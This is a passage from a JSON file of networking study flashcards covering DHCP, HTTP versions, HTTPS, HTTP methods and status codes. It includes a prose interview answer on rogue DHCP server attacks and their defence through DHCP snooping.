      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does DHCP work?",
      "steps": [
        {
          "step": 1,
          "title": "1. DHCPDISCOVER [Broadcast]",
          "desc": "Client has no IP. Broadcasts on UDP port 67 (Src 0.0.0.0:68 -> Dest 255.255.255.255:67, MAC FF:FF:FF:FF:FF:FF)."
        },
        {
          "step": 2,
          "title": "2. DHCPOFFER [Unicast/Broadcast]",
          "desc": "DHCP Server reserves unallocated IP and offers: IP 192.168.1.105, Mask 255.255.255.0, Gateway 192.168.1.1, DNS 8.8.8.8, Lease 86400s."
        },
        {
          "step": 3,
          "title": "3. DHCPREQUEST [Broadcast]",
          "desc": "Client broadcasts acceptance of this specific offer, notifying other potential DHCP servers to release their reserved offers."
        },
        {
          "step": 4,
          "title": "4. DHCPACK [Unicast/Broadcast]",
          "desc": "Server commits lease in its binding database and confirms assignment. Client binds IP to its NIC."
        }
      ],
      "vfxType": "dhcp"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Ports": "UDP Port 67 (DHCP Server) & UDP Port 68 (DHCP Client)",
        "Opcode": "1 (BOOTREQUEST), 2 (BOOTREPLY)",
        "xid": "32-bit transaction ID matching requests to replies",
        "yiaddr": "'Your IP Address' (the assigned IP offered to client)",
        "chaddr": "Client hardware MAC address (e.g. A4:5E:60:12:AB:9C)",
        "Lease Parameters": "IP, Subnet Mask (Opt 1), Router / Gateway (Opt 3), DNS (Opt 6), Lease Time (Opt 51)"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A student opens their laptop at a university library and joins the campus Wi-Fi.",
      "challenge": "The laptop has no IP address, no idea what subnet it is on, and no gateway configured.",
      "resolution": "In 150 ms, the DORA process assigns IP 10.20.14.88, subnet mask 255.255.240.0, default gateway 10.20.0.1, and DNS 10.20.0.2.",
      "vfxType": "dhcp"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "DORA Mnemonic": "Discover -> Offer -> Request -> Acknowledge",
        "Lease Renewal (T1)": "At 50% of lease time (e.g. 12 hours of 24h), client unicasts DHCPREQUEST to renew",
        "Rebind (T2)": "At 87.5% of lease time without reply, client broadcasts to find any DHCP server",
        "APIPA Fallback": "If DHCP fails, Windows self-assigns 169.254.X.Y (Link-local address)"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for DHCP (Dynamic Host Configuration Protocol) & DORA Process. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "dhcp"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "DHCP uses TCP to ensure reliable IP assignment.",
          "why": "A client without an IP address cannot perform a TCP 3-way handshake.",
          "correct": "DHCP operates over UDP because broadcast communication requires connectionless transport."
        },
        {
          "wrong": "The client keeps its DHCP IP address permanently until reboot.",
          "why": "IP addresses are leased, not sold.",
          "correct": "IPs expire when lease time lapses unless renewed at 50% (T1) or 87.5% (T2) intervals."
        },
        {
          "wrong": "DHCPREQUEST (Step 3) is unicast directly to the offering server.",
          "why": "Multiple DHCP servers on the subnet may have made offers.",
          "correct": "DHCPREQUEST is BROADCAST so other DHCP servers see which offer was accepted and can release their held IPs."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is a 'Rogue DHCP Server' attack and how does DHCP Snooping prevent it?",
          "a": "A Rogue DHCP Server attack occurs when an attacker connects an unauthorized DHCP server (or rogue Wi-Fi router) to a network switch. When clients broadcast DHCPDISCOVER, the rogue server responds faster than the legitimate network server, assigning clients a malicious Default Gateway IP (the attacker's machine) and malicious DNS server. All client internet traffic is intercepted in a Man-in-the-Middle (MITM) attack. Defense: DHCP Snooping on Layer 2 managed switches. The switch administrator configures the legitimate uplink port to the real DHCP server as 'Trusted', and all user access ports as 'Untrusted'. The switch hardware automatically inspects incoming traffic on Untrusted ports and drops any DHCPOFFER or DHCPACK packets, preventing rogue servers from answering clients.",
          "tip": "Explain the DORA sequence and explicitly mention DHCP Snooping on managed switches."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "DHCP = DORA (Discover -> Offer -> Request -> Acknowledge). Operates over UDP ports 67 & 68.",
        "summaryPoints": [
          "Automates configuration of IP, Subnet Mask, Default Gateway, and DNS servers.",
          "DORA handshake uses broadcasts to allow unconfigured clients to bootstrap.",
          "Lease renewal occurs automatically at 50% (T1) and 87.5% (T2) of lease duration.",
          "DHCP Snooping protects switches from rogue DHCP server attacks."
        ],
        "whenToUse": "Campus and enterprise LAN administration, Wi-Fi onboarding, and IP management."
      }
    }
  ],
  "http-protocol": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is HTTP?",
      "inSimpleWords": "HTTP is the stateless, application-layer request-response protocol powering the World Wide Web, governing how clients request resources and how servers serve web pages and APIs.",
      "analogy": "Ordering food at a diner: HTTP/1.0 is placing one order, paying, leaving, and getting back in line for drinks; HTTP/1.1 is sitting at a table with an open tab (Keep-Alive); HTTP/2 is a conveyor belt serving 10 dishes simultaneously over one table; HTTP/3 is pneumatic tubes flying independently so one spilled drink doesn't delay dessert.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need HTTP?",
      "problem": "Early HTTP opened a new TCP connection for every single image and CSS file, incurring massive 3-way handshake and slow-start latency penalties.",
      "whyItMatters": "Understanding HTTP versions explains modern web performance, API design, gRPC, and why websites load in milliseconds today.",
      "howSolves": "HTTP evolved from single-request connections (1.0) to persistent Keep-Alive connections (1.1), binary multiplexing over one TCP stream (2.0), and QUIC over UDP (3.0)."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does HTTP work?",
      "steps": [
        {
          "step": 1,
          "title": "HTTP/1.0 (1996)",
          "desc": "One TCP connection per request. Severe latency overhead due to repeated handshakes."
        },
        {
          "step": 2,
          "title": "HTTP/1.1 (1997)",
          "desc": "Introduced persistent connections (`Connection: keep-alive`), pipelining, chunked transfer encoding, and Host header for virtual hosting."
        },
        {
          "step": 3,
          "title": "HTTP/2 (2015)",
          "desc": "Binary framing layer. Multiplexes hundreds of concurrent streams over 1 single TCP connection. Header compression (HPACK) and Server Push."
        },
        {
          "step": 4,
          "title": "HTTP/3 (2022)",
          "desc": "Replaces TCP with QUIC over UDP. Eliminates transport-layer Head-of-Line blocking and enables 0-RTT handshakes."
        }
      ],
      "vfxType": "request-response"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "HTTP/1.1": "Text-based ASCII format | Persistent TCP connection | Subject to Application Head-of-Line blocking",
        "HTTP/2": "Binary protocol | Streams & Frames | Single TCP connection | Multiplexed | HPACK compression | TCP Head-of-Line blocking",
        "HTTP/3": "Binary protocol | QUIC over UDP (Port 443) | Independent streams | Zero Head-of-Line blocking | Integrated TLS 1.3",
        "Statelessness": "Each request is completely independent; state managed via Cookies, Sessions, and JWT tokens"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A modern web page loads 100 small icons, scripts, and stylesheet files.",
      "challenge": "Under HTTP/1.1, the browser is limited to 6 parallel TCP connections per domain, causing queuing delays.",
      "resolution": "Under HTTP/2, all 100 assets download concurrently interleaved over a single TCP socket without waiting for prior files to finish.",
      "vfxType": "request-response"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "HTTP/1.1 Request": "GET /api/user HTTP/1.1\\r\\nHost: example.com\\r\\nAccept: application/json\\r\\n\\r\\n",
        "HTTP/1.1 Response": "HTTP/1.1 200 OK\\r\\nContent-Type: application/json\\r\\nContent-Length: 42\\r\\n\\r\\n{\"status\":\"ok\"}",
        "HTTP/2 Binary Frames": "DATA, HEADERS, SETTINGS, PING, RST_STREAM, GOAWAY frames"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for HTTP (Hypertext Transfer Protocol) Evolution (1.0 vs 1.1 vs 2.0 vs 3.0). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "request-response"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "HTTP/2 completely eliminated Head-of-Line (HoL) blocking under all circumstances.",
          "why": "HTTP/2 eliminated application-layer HoL blocking, but suffered from TCP-layer HoL blocking.",
          "correct": "If a single packet drops on HTTP/2's single TCP connection, ALL multiplexed streams stall until retransmission. HTTP/3 solves this with QUIC."
        },
        {
          "wrong": "HTTP is an encrypted secure protocol.",
          "why": "Standard HTTP transmits all headers and data in plain cleartext.",
          "correct": "HTTP is cleartext; HTTPS wraps HTTP inside a TLS/SSL encrypted session."
        },
        {
          "wrong": "HTTP maintains an open connection state between user clicks natively.",
          "why": "HTTP is architecturally stateless.",
          "correct": "HTTP is stateless; state is simulated using Cookies, Session IDs in memory/Redis, or JWT tokens."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is Head-of-Line (HoL) Blocking and how did HTTP/2 and HTTP/3 solve it differently?",
          "a": "Head-of-Line (HoL) Blocking occurs when the head of a line of data blocks all subsequent items behind it. 1. In HTTP/1.1, HoL blocking happened at the application layer: over a single TCP connection, the client had to wait for the server to finish responding to Request 1 before Request 2 could be processed. Browsers worked around this by opening up to 6 separate TCP connections per domain. 2. HTTP/2 solved application-layer HoL blocking by introducing binary framing and multiplexing: multiple requests and responses are broken into frames with Stream IDs and interleaved over a single TCP connection concurrently. However, HTTP/2 introduced Transport-Layer HoL blocking: because all streams share one TCP connection, if one packet drops on the link, TCP freezes the entire socket buffer, stalling all 100 streams until retransmission. 3. HTTP/3 solved this by replacing TCP with QUIC over UDP. Each stream in QUIC has independent packet loss recovery. If Stream 1 loses a packet, Streams 2 through 100 continue downloading without any stall.",
          "tip": "Distinguish clearly between Application-Layer HoL (HTTP/1.1) vs Transport-Layer HoL (HTTP/2) vs Solution (HTTP/3 QUIC)."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "HTTP/1.1 = text + keep-alive; HTTP/2 = binary multiplexing over 1 TCP; HTTP/3 = QUIC over UDP.",
        "summaryPoints": [
          "HTTP is a stateless request-response protocol operating at the Application Layer.",
          "HTTP/1.1 added Keep-Alive to reuse TCP connections across multiple HTTP requests.",
          "HTTP/2 multiplexes streams over 1 TCP connection with HPACK header compression.",
          "HTTP/3 eliminates transport head-of-line blocking using QUIC over UDP."
        ],
        "whenToUse": "Frontend web performance, RESTful API design, microservices communication, and cloud infrastructure."
      }
    }
  ],
  "https-protocol": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is HTTPS Architecture, Encryption & Certificate Authorities?",
      "inSimpleWords": "HTTPS (Hypertext Transfer Protocol Secure, RFC 2818) is the secure encrypted version of HTTP, running over port 443 by encapsulating standard HTTP traffic inside a Transport Layer Security (TLS) cryptographic tunnel.",
      "analogy": "Sending a letter in a bulletproof, tamper-evident armored safe with a dual-key combination lock, verified by a notary public (Certificate Authority), rather than sending a transparent open postcard.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need HTTPS Architecture, Encryption & Certificate Authorities?",
      "problem": "Standard HTTP transmits passwords, cookies, credit card numbers, and medical records in cleartext, vulnerable to Wi-Fi eavesdropping and Man-in-the-Middle (MITM) tampering.",
      "whyItMatters": "HTTPS guarantees the CIA triad: Confidentiality (encryption), Integrity (tamper detection), and Authentication (verifying the server's genuine identity).",
      "howSolves": "Uses asymmetric public-key cryptography to authenticate the server and negotiate a shared secret key, followed by fast symmetric cipher encryption for the actual session data."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does HTTPS Architecture, Encryption & Certificate Authorities work?",
      "steps": [
        {
          "step": 1,
          "title": "Client Connection",
          "desc": "Browser connects to server on port 443 and initiates TLS cryptographic handshake."
        },
        {
          "step": 2,
          "title": "Certificate Verification",
          "desc": "Server presents X.509 Digital Certificate signed by a trusted Certificate Authority (CA). Browser verifies chain of trust."
        },
        {
          "step": 3,
          "title": "Session Key Generation",
          "desc": "Client and server use Diffie-Hellman Key Exchange to derive identical symmetric session keys without transmitting the key over the wire."
        },
        {
          "step": 4,
          "title": "Encrypted HTTP Data",
          "desc": "Standard HTTP requests and responses are encrypted with symmetric AES-GCM cipher and transmitted over TCP."
        }
      ],
      "vfxType": "request-response"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Default Port": "TCP Port 443 (vs Port 80 for HTTP)",
        "Encryption Model": "Hybrid: Asymmetric (RSA / ECC) for authentication & handshake; Symmetric (AES-256) for bulk payload",
        "Digital Certificate (X.509)": "Issued by trusted CA (Let's Encrypt, DigiCert); binds server domain to its public key",
        "CIA Triad": "Confidentiality (encryption) | Integrity (HMAC / GCM) | Authentication (digital certificates)"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A user logs into their online banking portal from an unsecured public airport Wi-Fi network.",
      "challenge": "An attacker runs a packet sniffer capturing every radio frame transmitted by the user's laptop.",
      "resolution": "Because the banking portal enforces HTTPS (TLS 1.3), the attacker sees only random ciphertext bytes (AES-256-GCM), completely unable to decipher credentials or session cookies.",
      "vfxType": "request-response"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "Root CA Store": "Built into OS and browsers (Microsoft, Apple, Mozilla root CA trust stores)",
        "Cipher Suite": "TLS_AES_256_GCM_SHA384",
        "HSTS Header": "Strict-Transport-Security: max-age=31536000; includeSubDomains (forces HTTPS)",
        "Free CA": "Let's Encrypt (ACME automated certificate provisioning)"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for HTTPS Architecture, Encryption & Certificate Authorities. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "request-response"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "HTTPS encrypts the entire session using asymmetric RSA public-key encryption.",
          "why": "Asymmetric encryption is computationally expensive and slow for large data transfers.",
          "correct": "HTTPS uses hybrid encryption: asymmetric cryptography during handshake, followed by high-speed symmetric ciphers (AES) for payload."
        },
        {
          "wrong": "An HTTPS green padlock means the website is safe from phishing or scams.",
          "why": "A certificate only verifies the domain owner matches the certificate; a scammer can legally buy a certificate for evil-fake-bank.com.",
          "correct": "HTTPS proves encryption and domain ownership, not that the website operator has legitimate ethical intentions."
        },
        {
          "wrong": "HTTPS hides the domain name you are connecting to from ISPs.",
          "why": "The Server Name Indication (SNI) header in TLS 1.2 is transmitted in cleartext.",
          "correct": "ISPs can see what domain name you connect to via DNS and SNI (unless using ESNI/ECH and DoH)."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is a Digital Certificate (X.509) and how does the browser verify the 'Chain of Trust'?",
          "a": "An X.509 Digital Certificate is a cryptographically signed electronic passport issued by a trusted Certificate Authority (CA) that binds a domain name (e.g. google.com) to its public encryption key. The browser verifies the certificate via a hierarchical 'Chain of Trust': 1. The server presents its End-Entity (Leaf) certificate. 2. The browser checks the digital signature on the leaf certificate, which was signed by an Intermediate CA's private key. 3. The browser validates the intermediate certificate, which was signed by a Root CA. 4. The browser compares the Root CA against its pre-installed, hardened 'Root CA Trust Store' embedded in the operating system (e.g. macOS keychain or Windows certificate store). If any link in the cryptographic signature chain is expired, revoked (via CRL/OCSP), or unsigned by a trusted root, the browser displays a severe security warning.",
          "tip": "Walk through the 3 levels: Leaf Certificate -> Intermediate CA -> Root CA in the OS trust store."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "HTTPS = HTTP + TLS on port 443. Hybrid encryption: Asymmetric for handshake; Symmetric for bulk data.",
        "summaryPoints": [
          "Provides Confidentiality (AES), Integrity (SHA/GCM), and Authentication (Certificates).",
          "X.509 certificates verified against browser's pre-installed Root CA store.",
          "HSTS header prevents SSL-stripping attacks by forcing browsers to use HTTPS.",
          "TLS 1.3 reduces handshake latency to 1 RTT (and 0 RTT for returning sessions)."
        ],
        "whenToUse": "Mandatory standard for all modern web applications, REST APIs, and e-commerce transactions."
      }
    }
  ],
  "http-methods": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is HTTP Request Methods, Idempotency & Safety?",
      "inSimpleWords": "HTTP methods (verbs) define the desired action to be performed on a target web resource, classified by their semantics, safety (read-only), and idempotency (repeatability without side effects).",
      "analogy": "A database CRUD operation: GET is reading a file; POST is creating a new file; PUT is replacing an entire file; PATCH is editing a single line; DELETE is throwing the file in the trash.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need HTTP Request Methods, Idempotency & Safety?",
      "problem": "Using GET requests to delete user accounts causes web crawlers (Googlebot) to accidentally wipe databases while indexing link previews.",
      "whyItMatters": "RESTful API design, HTTP caching, automated browser retries, and network proxies rely on strict method semantics to function correctly.",
      "howSolves": "RFC 7231 formalizes exact semantics for safe, idempotent, and non-idempotent verbs, allowing network clients to safely retry failed requests."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does HTTP Request Methods, Idempotency & Safety work?",
      "steps": [
        {
          "step": 1,
          "title": "GET (Safe & Idempotent)",
          "desc": "Retrieves resource representation. Never mutates server state; cacheable."
        },
        {
          "step": 2,
          "title": "POST (Unsafe & Non-Idempotent)",
          "desc": "Submits data to be processed (creates new record). Executing N times creates N distinct records."
        },
        {
          "step": 3,
          "title": "PUT (Idempotent)",
          "desc": "Completely replaces target resource with request payload (or creates if non-existent)."
        },
        {
          "step": 4,
          "title": "PATCH (Non-Idempotent)",
          "desc": "Applies partial modifications to a resource (e.g. updates only the email field)."
        },
        {
          "step": 5,
          "title": "DELETE (Idempotent)",
          "desc": "Deletes target resource. Executing N times leaves resource deleted."
        }
      ],
      "vfxType": "request-response"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "Safe Methods": "GET, HEAD, OPTIONS (read-only, no server state mutation)",
        "Idempotent Methods": "GET, HEAD, PUT, DELETE, OPTIONS (f(f(x)) = f(x); repeat calls produce identical server state)",
        "Non-Idempotent": "POST, PATCH (multiple calls create multiple distinct records / state mutations)",
        "HEAD Method": "Identical to GET, but returns ONLY headers without response body (used to check file size/existence)",
        "OPTIONS Method": "Used by CORS preflight checks to query supported HTTP verbs on the server"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A payment gateway experiences a network timeout while charging a customer $100 for an airline ticket.",
      "challenge": "If the client automated retry sends another POST /charge request, the customer will be double-charged $200.",
      "resolution": "Payment APIs enforce idempotency keys (e.g. `Idempotency-Key: req_123abc`). The server detects the duplicate key and returns the cached result without double-charging.",
      "vfxType": "request-response"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "GET": "GET /users/42 (Safe, Idempotent)",
        "POST": "POST /users (Create new user: Unsafe, Non-Idempotent)",
        "PUT": "PUT /users/42 (Replace entire user 42 object: Idempotent)",
        "PATCH": "PATCH /users/42 {\"status\":\"active\"} (Partial update)",
        "DELETE": "DELETE /users/42 (Idempotent)"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for HTTP Request Methods, Idempotency & Safety. Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "request-response"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "POST and PUT are completely interchangeable.",
          "why": "PUT is idempotent (full replacement); POST is non-idempotent (creates new resource with auto-generated ID).",
          "correct": "PUT replaces the resource at a known URI; POST creates a child resource under a collection URI."
        },
        {
          "wrong": "DELETE is not idempotent because the second request returns 404 Not Found instead of 200 OK.",
          "why": "Idempotency refers to SERVER RESOURCE STATE, not the exact HTTP status code returned.",
          "correct": "DELETE is idempotent: executing it once or ten times leaves the resource absent from the database."
        },
        {
          "wrong": "GET requests cannot have a request body according to the HTTP specification.",
          "why": "RFC 7231 does not strictly forbid a body, but servers and proxies may reject or ignore it.",
          "correct": "GET with a body is technically possible but discouraged and rejected by many CDNs and reverse proxies."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What does it mean for an HTTP method to be 'Idempotent' versus 'Safe'?",
          "a": "1. Safe Method: An HTTP method is Safe if it is read-only and does not alter the server's state (it produces no side effects). GET, HEAD, and OPTIONS are safe methods. Safe methods can be pre-fetched, cached, and crawled by search engines without risk. 2. Idempotent Method: An HTTP method is Idempotent if making multiple identical requests has the exact same effect on the server state as making a single request (mathematically, f(f(x)) = f(x)). GET, PUT, DELETE, HEAD, and OPTIONS are idempotent. For example, executing `PUT /user/1 {name: 'Alice'}` five times leaves the user named Alice every time. In contrast, executing `POST /orders` five times creates five separate orders. Browsers can automatically retry idempotent requests upon network timeout without asking the user.",
          "tip": "All Safe methods are Idempotent, but NOT all Idempotent methods are Safe (PUT and DELETE mutate state, so they are not safe, but they are idempotent)."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "Safe = read-only (GET). Idempotent = repeatable with same state (GET, PUT, DELETE). POST = non-idempotent.",
        "summaryPoints": [
          "GET: Read-only; safe and idempotent; cacheable.",
          "POST: Creates new resource; non-idempotent (not safely repeatable).",
          "PUT: Full replacement; idempotent.",
          "PATCH: Partial modification; semantics depend on patch format.",
          "DELETE: Removes resource; idempotent."
        ],
        "whenToUse": "REST API design, payment integration, idempotent webhook handlers, and backend architecture."
      }
    }
  ],
  "http-status-codes": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is HTTP Status Codes?",
      "inSimpleWords": "HTTP status codes are standardized 3-digit numerical responses issued by a server indicating the outcome of a client's HTTP request, categorized into 5 functional classes.",
      "analogy": "A traffic signal system: 1xx = 'Hold on, still processing'; 2xx = 'Green light, success!'; 3xx = 'Detour ahead, look over there'; 4xx = 'You made a driving mistake'; 5xx = 'The bridge collapsed, road broke'.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need HTTP Status Codes?",
      "problem": "Without standardized status codes, every web server would communicate errors using arbitrary English strings, making automated programmatic error handling impossible.",
      "whyItMatters": "Frontends, API clients, search engine crawlers, and monitoring systems rely on status codes to trigger retries, redirects, and error boundaries.",
      "howSolves": "5 distinct categories: 1xx (Informational), 2xx (Success), 3xx (Redirection), 4xx (Client Errors), 5xx (Server Errors)."
    },
    {
      "cardNumber": 3,
      "badge": "Mechanics",
      "title": "How does HTTP Status Codes work?",
      "steps": [
        {
          "step": 1,
          "title": "1xx Informational",
          "desc": "100 Continue (proceed with body), 101 Switching Protocols (upgrade to WebSocket)."
        },
        {
          "step": 2,
          "title": "2xx Success",
          "desc": "200 OK (standard success), 201 Created (POST success), 204 No Content (DELETE success with empty body)."
        },
        {
          "step": 3,
          "title": "3xx Redirection",
          "desc": "301 Moved Permanently (SEO permanent), 302 Found (temporary), 304 Not Modified (conditional cache hit)."
        },
        {
          "step": 4,
          "title": "4xx Client Error",
          "desc": "400 Bad Request, 401 Unauthorized (unauthenticated), 403 Forbidden (authenticated but no permission), 404 Not Found, 429 Too Many Requests."
        },
        {
          "step": 5,
          "title": "5xx Server Error",
          "desc": "500 Internal Server Error (unhandled exception), 502 Bad Gateway (upstream server crashed), 503 Service Unavailable, 504 Gateway Timeout."
        }
      ],
      "vfxType": "request-response"
    },
    {
      "cardNumber": 4,
      "badge": "Architecture",
      "title": "Internal Structure & Formats",
      "structureDetails": {
        "1xx (100 - 199)": "Informational request received, continuing process",
        "2xx (200 - 299)": "Action successfully received, understood, and accepted",
        "3xx (300 - 399)": "Further action must be taken to complete request (URL redirection)",
        "4xx (400 - 499)": "Client caused an error (invalid syntax, missing auth, bad URL)",
        "5xx (500 - 599)": "Server failed to fulfill an apparently valid request (backend crash, timeout)"
      },
      "diagramType": null
    },
    {
      "cardNumber": 5,
      "badge": "Process Flow",
      "title": "Step-by-Step Flow",
      "scenario": "A microservice behind an NGINX reverse proxy crashes with an uncaught NullPointerException.",
      "challenge": "What status code does the client receive from NGINX?",
      "resolution": "NGINX receives an abrupt socket close from the backend microservice and returns `502 Bad Gateway` to the client.",
      "vfxType": "request-response"
    },
    {
      "cardNumber": 6,
      "badge": "Example",
      "title": "Real-World Technical Example",
      "exampleValues": {
        "201 Created": "Returned with `Location: /users/42` header after POST",
        "304 Not Modified": "Returned when `If-None-Match: \"etag123\"` matches cached file",
        "401 vs 403": "401 = 'Who are you? (log in)'; 403 = 'I know who you are, but you cannot access this resource'",
        "504 Gateway Timeout": "Returned by reverse proxy when upstream backend takes longer than proxy_read_timeout"
      }
    },
    {
      "cardNumber": 7,
      "badge": "Execution",
      "title": "Interactive Live Flow Simulation",
      "fullWorkingFlow": "Complete end-to-end packet transmission for HTTP Status Codes (1xx, 2xx, 3xx, 4xx, 5xx). Observe how data moves between sender, intermediate network nodes, and receiver with dynamic states.",
      "vfxType": "request-response"
    },
    {
      "cardNumber": 8,
      "badge": "Traps",
      "title": "Common Mistakes & Interview Traps",
      "traps": [
        {
          "wrong": "401 Unauthorized means you are logged in but lack admin permission.",
          "why": "RFC 7235 explicitly defines 401 as 'Unauthenticated' (missing or invalid credentials).",
          "correct": "401 means Unauthenticated (not logged in); 403 Forbidden means Unauthorized (logged in, but lacking permission)."
        },
        {
          "wrong": "301 and 302 redirects behave identically in browsers and search engines.",
          "why": "301 is permanent and cached forever by browsers; 302 is temporary and not cached.",
          "correct": "301 transfers SEO page rank permanently; 302 retains original URL ranking and re-queries the origin."
        },
        {
          "wrong": "A 500 error means the client submitted invalid JSON.",
          "why": "Invalid client input should trigger a 400 Bad Request or 422 Unprocessable Entity.",
          "correct": "A 500 status code indicates an unhandled crash or exception inside server code, not invalid client input."
        }
      ]
    },
    {
      "cardNumber": 9,
      "badge": "Interview",
      "title": "Interview & Placement Question",
      "questions": [
        {
          "q": "What is the architectural difference between a 502 Bad Gateway and a 504 Gateway Timeout error in a microservices deployment?",
          "a": "Both 502 and 504 are returned by intermediary proxies (such as NGINX, AWS ALB, or Cloudflare) acting as gateways to upstream backend application servers. 1. 502 Bad Gateway: The reverse proxy contacted the upstream backend server, but the backend server returned an invalid response, reset the connection, or crashed unexpectedly (e.g. process died, out-of-memory crash, port closed). 2. 504 Gateway Timeout: The reverse proxy successfully established contact with the upstream backend, but the backend server failed to finish computing and returning a response within the proxy's configured timeout window (e.g. a slow database query ran for 60 seconds when `proxy_read_timeout` was set to 30 seconds).",
          "tip": "Explain: 502 = upstream crashed or returned garbage; 504 = upstream took too long to reply."
        }
      ]
    },
    {
      "cardNumber": 10,
      "badge": "Summary",
      "title": "Quick Revision & Cheat Sheet",
      "cheatSheet": {
        "keyRule": "2xx = Success; 3xx = Redirect; 4xx = Client fault; 5xx = Server fault. 401 = Unauthenticated, 403 = Forbidden.",
        "summaryPoints": [
          "200 OK, 201 Created (POST), 204 No Content (DELETE).",
          "301 Permanent Redirect (cached, transfers SEO); 302 Temporary Redirect.",
          "304 Not Modified validates conditional ETag caching without re-sending body.",
          "401 = Not Logged In; 403 = Logged in but access denied; 404 = Not Found.",
          "502 = Upstream backend crashed; 504 = Upstream backend timed out."
        ],
        "whenToUse": "Frontend error handling, API response crafting, site reliability monitoring, and web debugging."
      }
    }
  ],
  "tls-ssl-handshake": [
    {
      "cardNumber": 1,
      "badge": "Concept",
      "title": "What is TLS 1.2 vs TLS 1.3 Handshake & Cryptographic Exchange?",
      "inSimpleWords": "The Transport Layer Security (TLS) handshake is the cryptographic protocol that negotiates cipher suites, authenticates the server via digital certificates, and establishes shared symmetric encryption keys before application data transmits.",
      "analogy": "Two secret agents meeting in public: they verify each other's official credentials (digital certificates), exchange mathematical clues to agree on a secret codebook (Diffie-Hellman), and then whisper using that codebook so eavesdroppers hear only gibberish.",
      "diagramType": null
    },
    {
      "cardNumber": 2,
      "badge": "Motivation",
      "title": "Why do we need TLS 1.2 vs TLS 1.3 Handshake & Cryptographic Exchange?",
      "problem": "Transmitting cleartext passwords or symmetric encryption keys across the Internet allows any intermediate router to read or steal the master keys.",
